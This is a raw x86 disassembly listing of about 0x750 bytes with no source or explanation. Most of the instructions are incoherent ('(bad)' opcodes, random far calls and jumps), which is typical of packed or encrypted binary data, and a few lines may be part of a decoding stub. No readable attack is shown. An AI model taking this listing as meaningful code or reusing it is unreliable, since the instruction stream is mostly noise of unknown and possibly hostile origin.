  41b0e7:	or     BYTE PTR [ecx-0x49],ah
  41b0ea:	enter  0xd4fd,0x42
  41b0ee:	and    esi,DWORD PTR [edi-0x16]
  41b0f1:	pop    esp
  41b0f2:	(bad)  
  41b0f3:	push   ss
  41b0f4:	mov    al,0x83
  41b0f6:	test   DWORD PTR [edx-0x5b608c04],esi
  41b0fc:	sahf   
  41b0fd:	test   BYTE PTR ds:0xd164c5e1,ah
  41b103:	data16 mov al,0xf1
  41b106:	mov    ecx,0xfbe0c169
  41b10b:	inc    ebx
  41b10c:	dec    edx
  41b10d:	pop    ebp
  41b10e:	retf   0xfb8
  41b111:	lds    edx,FWORD PTR [esi-0x30]
  41b114:	addr16 pop edx
  41b116:	scas   al,BYTE PTR es:[edi]
  41b117:	jg     0x41b12e
  41b119:	add    edi,edx
  41b11b:	ret    
  41b11c:	jne    0x41b127
  41b11e:	pop    DWORD PTR [ebp-0x2e6fe657]
  41b124:	xchg   ebx,eax
  41b125:	dec    esp
  41b126:	call   0x6629:0xb5c6755b
  41b12d:	in     eax,0xe8
  41b12f:	sub    eax,0xd0cddc1e
  41b134:	ds hlt 
  41b136:	pop    ebx
  41b137:	adc    ebp,DWORD PTR [ebx]
  41b139:	lahf   
  41b13a:	xchg   BYTE PTR [edx],cl
  41b13c:	jmp    0x4bc6:0x80df4869
  41b143:	pop    edi
  41b144:	dec    esi
  41b145:	cmp    BYTE PTR [edx+0x5a85e8b6],dl
  41b14b:	xor    al,0x8
  41b14d:	in     al,dx
  41b14e:	shr    DWORD PTR [ebx],cl
  41b150:	fwait
  41b151:	test   al,0x9e
  41b153:	cmp    edx,DWORD PTR [ecx]
  41b155:	lods   eax,DWORD PTR ds:[esi]
  41b156:	aas    
  41b157:	or     eax,ebp
  41b159:	test   DWORD PTR [eax-0x6b],esi
  41b15c:	pop    ebx
  41b15d:	dec    edi
  41b15e:	out    0x6c,al
  41b160:	push   esi
  41b161:	adc    edx,ebx
  41b163:	retf   0x3a4b
  41b166:	popa   
  41b167:	jnp    0x41b163
  41b169:	fcmove st,st(3)
  41b16b:	xchg   ecx,eax
  41b16c:	cmp    eax,0x81ccf2a3
  41b171:	dec    edi
  41b172:	push   esi
  41b173:	push   ecx
  41b174:	sub    DWORD PTR ds:0x4229c6,0x422892
  41b17e:	push   eax
  41b17f:	xor    DWORD PTR ds:0x4228e6,0x42296a
  41b189:	push   edx
  41b18a:	jmp    0x41b5d3
  41b18f:	xor    DWORD PTR [esi],ecx
  41b191:	inc    esi
  41b192:	or     ebx,DWORD PTR [eax]
  41b194:	xor    ah,BYTE PTR [ecx]
  41b196:	and    al,0xeb
  41b198:	fwait
  41b199:	ds push 0x6e9a711b
  41b19f:	jge    0x41b1b6
  41b1a1:	or     al,0x16
  41b1a3:	(bad)  
  41b1a4:	push   cs
  41b1a5:	push   ss
  41b1a6:	push   ss
  41b1a7:	and    esi,DWORD PTR [eax-0x8]
  41b1aa:	sub    al,0xaa
  41b1ac:	push   esp
  41b1ad:	mov    ds:0x36bb6456,eax
  41b1b2:	xchg   BYTE PTR [ebp-0x56],bh
  41b1b5:	sahf   
  41b1b6:	push   ecx
  41b1b7:	add    BYTE PTR [ebp+0x50e20000],cl
  41b1bd:	bswap  ebx
  41b1bf:	dec    ebx
  41b1c0:	xchg   ebx,eax
  41b1c1:	imul   BYTE PTR [esi]
  41b1c3:	jl     0x41b1a9
  41b1c5:	fsubr  st,st(5)
  41b1c7:	push   ss
  41b1c8:	pop    ss
  41b1c9:	rcl    DWORD PTR [edi+0x56],cl
  41b1cc:	sti    
  41b1cd:	push   DWORD PTR [ebx]
  41b1cf:	cli    
  41b1d0:	mov    bl,bh
  41b1d2:	popf   
  41b1d3:	mov    dh,0xff
  41b1d5:	icebp  
  41b1d6:	imul   esi,DWORD PTR [edx],0xaae6ec77
  41b1dc:	mov    ch,0x16
  41b1de:	test   eax,0x46c6015d
  41b1e3:	or     al,0xe6
  41b1e5:	(bad)  
  41b1e6:	loop   0x41b170
  41b1e8:	stc    
  41b1e9:	loopne 0x41b202
  41b1eb:	mov    fs:0xbdcfec11,al
  41b1f1:	pop    esi
  41b1f2:	shl    DWORD PTR [ebp+0x18],1
  41b1f5:	dec    ebx
  41b1f6:	xor    eax,0x1d01ed2f
  41b1fb:	sahf   
  41b1fc:	(bad)  
  41b1fd:	cwde   
  41b1fe:	js     0x41b1f7
  41b200:	outs   dx,DWORD PTR ds:[esi]
  41b201:	clc    
  41b202:	inc    eax
  41b203:	xor    eax,0x7ef1cad6
  41b208:	push   edx
  41b209:	mov    esp,0xe4a860b0
  41b20e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b20f:	mov    esi,0x40e92a3e
  41b214:	sahf   
  41b215:	jmp    0x41b27f
  41b217:	fnstcw WORD PTR [ebp-0x1e]
  41b21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b21b:	lods   al,BYTE PTR ds:[esi]
  41b21c:	retf   0xd357
  41b21f:	test   eax,edx
  41b221:	popf   
  41b222:	ror    BYTE PTR [ebx-0x38],cl
  41b225:	ja     0x41b1d9
  41b227:	(bad)  [ecx-0x55]
  41b22a:	and    al,0x57
  41b22c:	mov    DWORD PTR [ecx+0x59],ebp
  41b22f:	pop    edi
  41b230:	mov    ch,0x8d
  41b232:	arpl   WORD PTR [edx+0x16e0d4fa],si
  41b238:	aam    0xac
  41b23a:	push   eax
  41b23b:	fsub   st,st(5)
  41b23d:	mov    edx,0x3d526c25
  41b242:	test   al,0x6c
  41b244:	xlat   BYTE PTR ds:[ebx]
  41b245:	mov    eax,ds:0xcf4c1281
  41b24a:	xchg   DWORD PTR [ebp+0x45],ebx
  41b24d:	rol    ah,1
  41b24f:	arpl   WORD PTR ds:0x3e0e47f7,dx
  41b255:	fdivr  QWORD PTR [eax-0x24]
  41b258:	aam    0xcc
  41b25a:	das    
  41b25b:	repnz int3 
  41b25d:	stc    
  41b25e:	mov    ah,0x27
  41b260:	push   ebx
  41b261:	mov    al,ds:0x30fe779f
  41b266:	or     eax,0x10621714
  41b26b:	pop    edi
  41b26c:	pushf  
  41b26d:	imul   ebp,ebp,0x3dbaa4ab
  41b273:	lods   eax,DWORD PTR ds:[esi]
  41b274:	mov    esp,0xda319b23
  41b279:	sar    bh,cl
  41b27b:	xor    al,0x29
  41b27d:	(bad)  
  41b27f:	cmp    BYTE PTR [edi+edx*4+0x3a67461f],cl
  41b286:	jl     0x41b2dc
  41b288:	daa    
  41b289:	rcr    eax,1
  41b28b:	les    edx,FWORD PTR [ecx-0x7d]
  41b28e:	mov    dl,0x71
  41b290:	sbb    BYTE PTR [edi],al
  41b292:	dec    edi
  41b293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b294:	mov    bl,0xb
  41b296:	gs std 
  41b298:	fwait
  41b299:	in     eax,dx
  41b29a:	outs   dx,DWORD PTR ds:[esi]
  41b29b:	dec    edi
  41b29c:	retf   
  41b29d:	xor    DWORD PTR [ebx],esi
  41b29f:	xor    cx,WORD PTR [ecx+0x2cc43a54]
  41b2a6:	inc    ebx
  41b2a7:	neg    DWORD PTR [edi+0x3733b595]
  41b2ad:	and    BYTE PTR [ebp-0x42850b16],0x95
  41b2b4:	cmp    eax,0x85a29a26
  41b2b9:	pop    ds
  41b2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2bb:	sti    
  41b2bc:	dec    edi
  41b2bd:	push   DWORD PTR [ecx]
  41b2bf:	cmp    bl,BYTE PTR [edx+0xf22dbf1]
  41b2c5:	dec    ecx
  41b2c6:	xchg   ebx,eax
  41b2c7:	adc    al,0x45
  41b2c9:	inc    ecx
  41b2ca:	sub    ebx,eax
  41b2cc:	xor    ebp,DWORD PTR [ebx]
  41b2ce:	call   0x50b12200
  41b2d3:	add    esi,ecx
  41b2d5:	neg    esp
  41b2d7:	xchg   edi,eax
  41b2d8:	stos   DWORD PTR es:[edi],eax
  41b2d9:	dec    esi
  41b2da:	leave  
  41b2db:	js     0x41b28c
  41b2dd:	pop    esp
  41b2de:	pusha  
  41b2df:	jnp    0x41b272
  41b2e1:	shr    BYTE PTR [ecx-0x361d5892],1
  41b2e7:	and    bl,0x19
  41b2ea:	sub    eax,0xe1776ebd
  41b2ef:	mov    ds:0x4164b687,eax
  41b2f4:	push   ebp
  41b2f5:	and    BYTE PTR [eax-0x38],al
  41b2f8:	pop    edi
  41b2f9:	cwde   
  41b2fa:	loopne 0x41b2cd
  41b2fc:	sahf   
  41b2fd:	shl    DWORD PTR [ecx],0xce
  41b300:	test   ebx,ecx
  41b302:	push   0x31
  41b304:	sub    bl,bl
  41b306:	pop    ebx
  41b307:	add    DWORD PTR [eax-0x5ee27a07],ecx
  41b30d:	cwde   
  41b30e:	adc    BYTE PTR [edi+0x48],dh
  41b311:	xor    edi,edi
  41b313:	les    edx,FWORD PTR [ebx]
  41b315:	loope  0x41b34f
  41b317:	mov    al,0xd8
  41b319:	bound  ebx,QWORD PTR [ebx-0x7d46ccda]
  41b31f:	int    0xc7
  41b321:	retf   
  41b322:	es std 
  41b324:	lods   al,BYTE PTR ds:[esi]
  41b325:	or     al,0x83
  41b327:	xor    eax,0xa3a11434
  41b32c:	out    0xb2,al
  41b32e:	leave  
  41b32f:	xchg   edi,eax
  41b331:	outs   dx,DWORD PTR ds:[esi]
  41b332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b333:	pop    edi
  41b334:	xor    DWORD PTR [eax-0x2aae5a42],edi
  41b33a:	pusha  
  41b33b:	popf   
  41b33c:	mov    DWORD PTR [ebx+0x1cc95448],edx
  41b342:	aad    0x78
  41b344:	pop    esi
  41b345:	shl    DWORD PTR [edi-0x236d63c2],cl
  41b34b:	scas   al,BYTE PTR es:[edi]
  41b34c:	pusha  
  41b34d:	push   ss
  41b34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b34f:	mov    edi,0x10241efa
  41b354:	jecxz  0x41b2d9
  41b356:	push   ecx
  41b357:	sbb    edi,esp
  41b359:	jbe    0x41b34d
  41b35b:	and    cl,al
  41b35d:	int    0x74
  41b35f:	stc    
  41b360:	or     ch,BYTE PTR [edi+0x40cb5e2d]
  41b366:	int    0xd1
  41b368:	adc    edx,DWORD PTR [eax]
  41b36a:	rol    BYTE PTR [ecx+0x7c],1
  41b36d:	lock js 0x41b36e
  41b370:	jle    0x41b3e1
  41b372:	jl     0x41b33e
  41b374:	mov    esi,ebp
  41b376:	jp     0x41b3ba
  41b378:	ja     0x41b2fc
  41b37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b37b:	xlat   BYTE PTR ds:[ebx]
  41b37c:	or     DWORD PTR [edi+edx*1+0x7c85d648],edi
  41b383:	add    dh,BYTE PTR [eax]
  41b385:	cs or  cl,al
  41b388:	sbb    eax,0x8919f5f3
  41b38d:	xor    DWORD PTR [esi],ebx
  41b38f:	into   
  41b390:	jge    0x41b3d6
  41b392:	out    dx,al
  41b393:	mov    esp,0x7e229a0c
  41b398:	lods   eax,DWORD PTR ds:[esi]
  41b399:	lods   eax,DWORD PTR ds:[esi]
  41b39a:	aas    
  41b39b:	shr    DWORD PTR ds:0x7a2a2d9f,1
  41b3a1:	push   es
  41b3a2:	pop    es
  41b3a3:	retf   
  41b3a4:	mov    eax,ds:0x47e5a798
  41b3a9:	outs   dx,BYTE PTR ds:[esi]
  41b3aa:	adc    DWORD PTR [esi+eiz*8+0x15],edx
  41b3ae:	sub    eax,0xeec8146b
  41b3b3:	inc    edx
  41b3b4:	ja     0x41b398
  41b3b6:	sbb    bh,BYTE PTR [edi]
  41b3b8:	cmp    al,0x3
  41b3ba:	and    al,0x2
  41b3bc:	outs   dx,DWORD PTR ds:[esi]
  41b3bd:	adc    ebp,eax
  41b3bf:	lods   al,BYTE PTR ds:[esi]
  41b3c0:	in     al,dx
  41b3c1:	xor    al,0xf8
  41b3c3:	xlat   BYTE PTR ds:[ebx]
  41b3c4:	xor    cl,bh
  41b3c6:	xchg   edx,eax
  41b3c7:	sbb    eax,DWORD PTR [ecx]
  41b3c9:	cmp    ebx,ebx
  41b3cb:	sar    DWORD PTR [esi],cl
  41b3cd:	ja     0x41b393
  41b3cf:	adc    al,BYTE PTR [esi]
  41b3d1:	ret    
  41b3d2:	(bad)  
  41b3d3:	mov    edi,0x78ffe4a8
  41b3d8:	fsubr  DWORD PTR [edi-0x19]
  41b3db:	and    BYTE PTR [edx-0x45e1674a],ah
  41b3e1:	adc    ch,dh
  41b3e3:	(bad)  
  41b3e4:	stos   DWORD PTR es:[edi],eax
  41b3e5:	push   ecx
  41b3e6:	cmc    
  41b3e7:	sub    edx,DWORD PTR [eax-0x63]
  41b3ea:	mov    ebp,0x325f3f94
  41b3ef:	push   esi
  41b3f0:	lahf   
  41b3f1:	ja     0x41b401
  41b3f3:	sbb    eax,ebp
  41b3f5:	push   ebp
  41b3f6:	pop    ebp
  41b3f7:	push   cs
  41b3f8:	cdq    
  41b3f9:	pop    es
  41b3fa:	xchg   esp,eax
  41b3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3fc:	jmp    DWORD PTR [ecx+ebp*1-0x70787a43]
  41b403:	inc    esi
  41b404:	and    eax,0x305a0760
  41b409:	nop
  41b40a:	jno    0x41b44d
  41b40c:	stos   DWORD PTR es:[edi],eax
  41b40d:	lods   eax,DWORD PTR ds:[esi]
  41b40e:	mov    ds:0x1980fac2,al
  41b414:	bound  esi,QWORD PTR [eax]
  41b416:	out    dx,al
  41b417:	adc    edi,DWORD PTR [esi+0x3bb799e8]
  41b41d:	and    al,0xc7
  41b41f:	fcom   DWORD PTR ss:[ebx-0x8]
  41b423:	or     al,0xcf
  41b425:	adc    al,BYTE PTR [edi+0x4f]
  41b428:	das    
  41b429:	rol    DWORD PTR [ebp+edx*2+0x27],1
  41b42d:	in     al,0x9c
  41b42f:	push   edx
  41b430:	mov    WORD PTR [edi+0xd],?
  41b433:	lea    eax,[ebp+0xa]
  41b436:	mov    ds:0x202801b,eax
  41b43b:	dec    ebp
  41b43c:	push   0xffffffe0
  41b43e:	dec    esi
  41b43f:	xor    edx,edx
  41b441:	or     al,0x33
  41b443:	pop    ss
  41b444:	or     edi,DWORD PTR [ebx+0x77]
  41b447:	and    al,0x55
  41b449:	aam    0x5b
  41b44b:	sbb    al,0x54
  41b44d:	test   eax,0xdc0cdccf
  41b452:	clc    
  41b453:	and    ebp,DWORD PTR [ebp+0x78]
  41b456:	ins    DWORD PTR es:[edi],dx
  41b457:	push   esp
  41b458:	jecxz  0x41b4ab
  41b45a:	clc    
  41b45b:	mov    esi,fs
  41b45d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b45e:	mov    dh,BYTE PTR [edx+0x2ce1b0ad]
  41b464:	je     0x41b423
  41b466:	pop    edi
  41b467:	pop    ebp
  41b468:	aas    
  41b469:	xor    DWORD PTR [edx],esp
  41b46b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b46c:	jns    0x41b472
  41b46e:	daa    
  41b46f:	lds    edx,FWORD PTR [esp+eiz*8]
  41b472:	repnz and esi,ebx
  41b475:	(bad)  
  41b476:	stos   DWORD PTR es:[edi],eax
  41b477:	test   al,0x52
  41b479:	xor    ebp,DWORD PTR [ebx+0x6b23c99a]
  41b47f:	in     al,0x4e
  41b481:	dec    ebx
  41b482:	bound  ebx,QWORD PTR [ebp+0x5efb78bf]
  41b488:	shl    BYTE PTR [eax],0x46
  41b48b:	jno    0x41b444
  41b48d:	jmp    0x41b443
  41b48f:	sub    al,0x2c
  41b491:	sub    al,0x3b
  41b493:	(bad)  
  41b494:	fisub  DWORD PTR [si+0x7007]
  41b499:	mov    ebx,0xb3a6f371
  41b49e:	test   eax,0x77100bb9
  41b4a3:	popa   
  41b4a4:	push   ecx
  41b4a5:	leave  
  41b4a6:	jae    0x41b527
  41b4a8:	jno    0x41b4e6
  41b4aa:	add    al,0x30
  41b4ac:	xlat   BYTE PTR ds:[ebx]
  41b4ad:	add    al,0x21
  41b4af:	cmp    edi,DWORD PTR [edi-0x29d6b919]
  41b4b5:	jmp    0x41b445
  41b4b7:	cmp    bl,ah
  41b4b9:	pcmpgtd mm5,mm5
  41b4bc:	call   DWORD PTR [eax+edi*8]
  41b4bf:	scas   al,BYTE PTR es:[edi]
  41b4c0:	call   0xa11:0x4662af1c
  41b4c7:	repnz pop ebp
  41b4c9:	xor    bh,BYTE PTR [ebx-0x79693307]
  41b4cf:	dec    ebp
  41b4d0:	outs   dx,DWORD PTR ds:[esi]
  41b4d1:	or     eax,0xe601b2b6
  41b4d6:	inc    edx
  41b4d7:	sub    ah,BYTE PTR [edi+0x8c07168]
  41b4dd:	mov    ah,0x2f
  41b4df:	aam    0xef
  41b4e1:	or     al,0xff
  41b4e3:	adc    DWORD PTR [edi+0x16630983],eax
  41b4e9:	dec    ecx
  41b4ea:	push   0xbb5feecb
  41b4ef:	stos   BYTE PTR es:[edi],al
  41b4f0:	pop    esp
  41b4f1:	mov    bl,BYTE PTR [esi-0x44]
  41b4f4:	sbb    eax,0x11f97821
  41b4f9:	les    ebp,FWORD PTR [ebp-0x1773a523]
  41b4ff:	iret   
  41b500:	xor    al,BYTE PTR [eax]
  41b502:	inc    esi
  41b503:	adc    bh,BYTE PTR [esi-0x51]
  41b506:	adc    DWORD PTR [edx+0x1ca6cbc2],esi
  41b50c:	jo     0x41b563
  41b50e:	mov    ds:0x9e7d80ca,eax
  41b513:	sub    BYTE PTR [ebx-0x70],cl
  41b516:	inc    esi
  41b517:	(bad)  
  41b518:	je     0x41b54a
  41b51a:	xchg   ecx,eax
  41b51b:	mov    eax,ds:0xf218b8a0
  41b520:	cli    
  41b521:	ins    DWORD PTR es:[edi],dx
  41b522:	ins    BYTE PTR es:[edi],dx
  41b523:	cmp    ebx,0x57
  41b526:	mov    edx,0x75ac47fb
  41b52b:	jp     0x41b533
  41b52d:	push   edx
  41b52e:	mov    esi,0x8670a51e
  41b533:	xor    esp,ecx
  41b535:	stos   BYTE PTR es:[edi],al
  41b536:	push   es
  41b537:	cmp    BYTE PTR [edi],ch
  41b539:	jmp    0x41b4d3
  41b53b:	sub    ecx,ebp
  41b53d:	push   esi
  41b53e:	les    ebx,FWORD PTR [edi]
  41b540:	mov    esp,DWORD PTR [ebx+0x62]
  41b543:	ror    BYTE PTR [edi-0x4d],cl
  41b546:	fcmovnu st,st(7)
  41b548:	int3   
  41b549:	adc    al,0xf5
  41b54b:	jge    0x41b509
  41b54d:	sbb    al,0x6a
  41b54f:	cwde   
  41b550:	ret    0x2832
  41b553:	mov    bl,0xab
  41b555:	add    eax,0x12aa1be4
  41b55a:	pop    edx
  41b55b:	retf   
  41b55c:	dec    ebx
  41b55d:	and    DWORD PTR [eax],0xffffffe8
  41b560:	push   0xffffffe4
  41b562:	ss push ecx
  41b564:	sbb    ah,BYTE PTR [edi+0x5d]
  41b567:	cld    
  41b568:	in     eax,dx
  41b569:	jmp    DWORD PTR es:[ebp-0x4158c414]
  41b570:	(bad)  
  41b571:	pop    edx
  41b572:	jb     0x41b5c5
  41b574:	neg    BYTE PTR [ecx]
  41b576:	pop    ss
  41b577:	not    DWORD PTR [ebx+0x1b]
  41b57a:	add    BYTE PTR [ebp-0x2c],dl
  41b57d:	paddusw mm7,QWORD PTR [eax+0x5c62f63a]
  41b584:	or     eax,0x8435f59b
  41b589:	imul   ecx,DWORD PTR [edx+0x5b6916df],0x251f4841
  41b593:	jp     0x41b5be
  41b595:	adc    al,0x0
  41b597:	ret    0xfb07
  41b59a:	mov    ds:0x4889c4e7,eax
  41b59f:	std    
  41b5a0:	rol    BYTE PTR [eax+edi*1-0x7],1
  41b5a4:	jl     0x41b58e
  41b5a6:	stc    
  41b5a7:	(bad)  
  41b5a8:	jecxz  0x41b577
  41b5aa:	mov    al,ds:0xf48d08b6
  41b5af:	jecxz  0x41b5c2
  41b5b1:	shr    DWORD PTR [ebx-0x5360e42a],cl
  41b5b7:	inc    ebp
  41b5b8:	stos   BYTE PTR es:[edi],al
  41b5b9:	lea    esi,[ebx+0x1e8e1c61]
  41b5bf:	in     eax,0x8e
  41b5c1:	cld    
  41b5c2:	dec    ecx
  41b5c3:	inc    edx
  41b5c4:	cmp    ah,0xb1
  41b5c7:	mov    ebp,0xa83d3dad
  41b5cc:	not    bh
  41b5ce:	cmp    dh,BYTE PTR [ebp-0x17480d32]
  41b5d4:	dec    esi
  41b5d5:	sub    al,BYTE PTR [eax]
  41b5d7:	add    cl,ch
  41b5d9:	inc    esp
  41b5da:	add    al,0x0
  41b5dc:	add    BYTE PTR [esi],cl
  41b5de:	adc    BYTE PTR [esi+edi*8+0x58],0xd3
  41b5e3:	fs xor ch,0xf0
  41b5e7:	and    al,0x68
  41b5e9:	xchg   ebp,eax
  41b5ea:	shl    BYTE PTR [edx+0xc0d2d72],cl
  41b5f0:	push   ss
  41b5f1:	(bad)  
  41b5f2:	push   cs
  41b5f3:	push   ss
  41b5f4:	push   ss
  41b5f5:	cmp    eax,DWORD PTR [edx+0x5f]
  41b5f8:	(bad)  
  41b5fa:	jge    0x41b655
  41b5fc:	in     eax,0x8f
  41b5fe:	ret    
  41b5ff:	je     0x41b5c8
  41b601:	push   ss
  41b602:	jp     0x41b61a
  41b604:	cdq    
  41b605:	out    dx,al
  41b606:	aas    
  41b607:	xlat   BYTE PTR ds:[ebx]
  41b608:	xor    eax,0xf2d6b8fd
  41b60d:	mov    DWORD PTR [esi-0x4c0a4f70],edx
  41b613:	das    
  41b614:	push   ebx
  41b615:	enter  0xdbb2,0xba
  41b619:	sbb    ecx,0x0
  41b61c:	cld    
  41b61d:	popf   
  41b61e:	(bad)  
  41b61f:	out    dx,eax
  41b620:	ja     0x41b635
  41b622:	sub    esp,DWORD PTR [edx]
  41b624:	dec    edi
  41b625:	cmp    dl,cl
  41b627:	loopne 0x41b646
  41b629:	enter  0xae92,0xbd
  41b62d:	call   0xc3e3:0xb139640f
  41b634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b635:	push   eax
  41b636:	xchg   esi,eax
  41b637:	jl     0x41b5dc
  41b639:	das    
  41b63a:	out    0xf9,eax
  41b63c:	mov    al,ds:0x186e933a
  41b641:	push   ds
  41b642:	ja     0x41b628
  41b644:	xbegin 0x65f4b7de
  41b64a:	xor    eax,0x5027131f
  41b64f:	xor    ah,dh
  41b651:	jecxz  0x41b658
  41b653:	and    dh,BYTE PTR [ecx+edi*1-0x49]
  41b657:	stos   DWORD PTR es:[edi],eax
  41b658:	xor    dh,BYTE PTR [edx]
  41b65a:	mov    dh,0xb2
  41b65c:	fincstp 
  41b65e:	inc    DWORD PTR [esi-0x4c]
  41b661:	sub    eax,0xa7201dc3
  41b666:	pop    edi
  41b667:	push   cs
  41b668:	cdq    
  41b669:	pop    edx
  41b66a:	jbe    0x41b6da
  41b66c:	add    BYTE PTR [ebx-0xa],0xbb
  41b670:	aam    0x3b
  41b672:	fwait
  41b673:	xchg   edx,eax
  41b674:	mov    eax,0x3f9c695a
  41b679:	sahf   
  41b67a:	into   
  41b67b:	inc    esi
  41b67c:	cmp    cl,BYTE PTR [ebp+0x7bd7eb5e]
  41b682:	push   cs
  41b683:	(bad)  
  41b684:	dec    ecx
  41b685:	push   esi
  41b686:	mov    ds:0xce0afa79,al
  41b68b:	mov    bl,0x7
  41b68d:	jns    0x41b69c
  41b68f:	adc    dl,0x1e
  41b692:	jmp    0xd2557dbb
  41b697:	pop    esp
  41b698:	sub    bh,BYTE PTR [ecx+0x79]
  41b69b:	mov    cl,0xf9
  41b69d:	fldenv [ebp-0x10c1a8e8]
  41b6a3:	test   al,0x20
  41b6a5:	mov    edx,0xb9ceb821
  41b6aa:	rol    esp,cl
  41b6ac:	or     BYTE PTR [esi-0x70],ah
  41b6af:	dec    ecx
  41b6b0:	cmp    al,0xf5
  41b6b2:	jg     0x41b640
  41b6b4:	xchg   edi,eax
  41b6b5:	push   edi
  41b6b6:	gs jae 0x41b648
  41b6b9:	or     eax,0x93d1740a
  41b6be:	outs   dx,DWORD PTR ds:[esi]
  41b6bf:	cmp    bh,bl
  41b6c1:	pop    ds
  41b6c2:	mov    ecx,0xaa7a50a0
  41b6c7:	gs push edi
  41b6c9:	outs   dx,WORD PTR ds:[esi]
  41b6cb:	into   
  41b6cc:	xor    al,0xf2
  41b6ce:	push   0x71
  41b6d0:	push   ds
  41b6d1:	popf   
  41b6d2:	or     al,0xd8
  41b6d4:	mov    ch,BYTE PTR [edi]
  41b6d6:	arpl   WORD PTR [ebp-0x3d],ax
  41b6d9:	call   0x891a4503
  41b6de:	repnz push eax
  41b6e0:	popf   
  41b6e1:	aad    0x74
  41b6e3:	aad    0x1
  41b6e5:	inc    ebx
  41b6e6:	add    eax,0x5a6deb62
  41b6eb:	inc    ebx
  41b6ec:	in     eax,dx
  41b6ed:	sbb    BYTE PTR [esi+0x1db528c2],cl
  41b6f3:	cmp    eax,0x9eb0d690
  41b6f8:	loope  0x41b700
  41b6fa:	fisttp DWORD PTR [ebx+0x45]
  41b6fd:	adc    eax,0x7d99829b
  41b702:	repnz adc ch,cl
  41b705:	add    eax,0xab36d37a
  41b70a:	cmp    cl,BYTE PTR ds:0xca63171f
  41b710:	mov    edi,0xcea732c8
  41b715:	out    dx,eax
  41b716:	pop    ss
  41b717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b718:	or     eax,0x3f114351
  41b71d:	or     al,BYTE PTR [ebx]
  41b71f:	sub    al,0xea
  41b721:	fldenv es:[ebx-0x2fef4ef3]
  41b728:	jl     0x41b785
  41b72a:	sbb    esi,ebp
  41b72c:	and    DWORD PTR [ebx],0xdf030935
  41b732:	jbe    0x41b718
  41b734:	jmp    0x41b751
  41b736:	je     0x41b774
  41b738:	enter  0xd80b,0x5c
  41b73c:	inc    edi
  41b73d:	mov    DWORD PTR [edx+0x54],edx
  41b740:	add    al,0x2f
  41b742:	mov    ebp,0x186773b1
  41b747:	jae    0x41b6df
  41b749:	fcmovb st,st(6)
  41b74b:	jnp    0x41b7b6
  41b74d:	in     eax,dx
  41b74e:	test   BYTE PTR [ebp+0x8],ah
  41b751:	and    eax,0x16ec0f05
  41b756:	and    ecx,ecx
  41b758:	je     0x41b79d
  41b75a:	pop    edx
  41b75b:	sub    cl,BYTE PTR [ebp-0x60e68235]
  41b761:	sub    BYTE PTR [ebx-0x6e56454a],bh
  41b767:	ins    BYTE PTR es:[edi],dx
  41b768:	dec    edi
  41b769:	add    eax,0xfe378348
  41b76e:	or     eax,DWORD PTR [esi+edx*4]
  41b771:	pushf  
  41b772:	out    dx,al
  41b773:	mov    ecx,0x6e1f154c
  41b778:	addr16 leave 
  41b77a:	imul   ecx,edx,0x78
  41b77d:	mov    esi,0x78459a3c
  41b782:	shr    DWORD PTR [eax+ebx*4],1
  41b785:	dec    ebx
  41b786:	stc    
  41b787:	xor    BYTE PTR ds:0xd6a9239,0xf2
  41b78e:	push   ebp
  41b78f:	cwde   
  41b790:	pop    ebp
  41b791:	(bad)  
  41b792:	stc    
  41b793:	mov    bh,0x4a
  41b795:	ficom  DWORD PTR [esi]
  41b797:	das    
  41b798:	data16 (bad) 
  41b79a:	pop    ss
  41b79b:	shl    DWORD PTR [edi+0x1c],1
  41b79e:	jbe    0x41b80d
  41b7a0:	cmp    BYTE PTR ds:0x8b758328,dl
  41b7a6:	xor    ebp,esp
  41b7a8:	imul   ecx,DWORD PTR [esi+0x668d5960],0x39
  41b7af:	outs   dx,BYTE PTR ds:[esi]
  41b7b0:	xor    BYTE PTR [edx+0x7],cl
  41b7b3:	in     al,0x3b
  41b7b5:	mov    esp,0x533c58f7
  41b7ba:	loope  0x41b75b
  41b7bc:	mov    dl,0xd9
  41b7be:	aas    
  41b7bf:	repz call 0x45f6:0xe766cba2
  41b7c7:	sub    ebx,DWORD PTR [esi-0x58c66aaf]
  41b7cd:	popa   
  41b7ce:	rcl    edx,1
  41b7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7d1:	or     al,0x8e
  41b7d3:	out    dx,al
  41b7d4:	mov    esi,0x90e33ff3
  41b7d9:	pop    es
  41b7da:	aam    0xf0
  41b7dc:	sub    cl,ch
  41b7de:	adc    cl,BYTE PTR gs:[edi-0x4201903f]
  41b7e5:	inc    ebp
  41b7e6:	adc    ah,BYTE PTR [edx+0xb]
  41b7e9:	fdivr  QWORD PTR [ebx-0x463ab0d]
  41b7ef:	sbb    BYTE PTR [eax],0x74
  41b7f2:	sbb    eax,0xb0a88052
  41b7f7:	imul   ebp,DWORD PTR [edi+0x72027463],0x242c936f
  41b801:	call   0xde5e:0xc2d832eb
  41b808:	cmp    al,0xf2
  41b80a:	ins    DWORD PTR es:[edi],dx
  41b80b:	int3   
  41b80c:	je     0x41b7f1
  41b80e:	add    ecx,0x21
  41b811:	jmp    0x7cea:0xfcb4c6ae
  41b818:	stos   DWORD PTR es:[edi],eax
  41b819:	xlat   BYTE PTR ds:[ebx]
  41b81a:	mov    bl,0x7e
  41b81c:	mov    dh,0x91
  41b81e:	aaa    
  41b81f:	xchg   esp,ebx
  41b821:	(bad)  
  41b822:	aas    
  41b823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b825:	cmp    al,0xdc
  41b827:	mov    eax,0xec2c79f7
  41b82c:	push   ecx
  41b82d:	or     DWORD PTR [ebp+0x56],0x5e00999
  41b834:	mov    cl,0x7a
  41b836:	jmp    0xdb55d5e8
  41b83b:	in     al,0xc7
  41b83d:	daa    
  41b83e:	jno    0x41b846
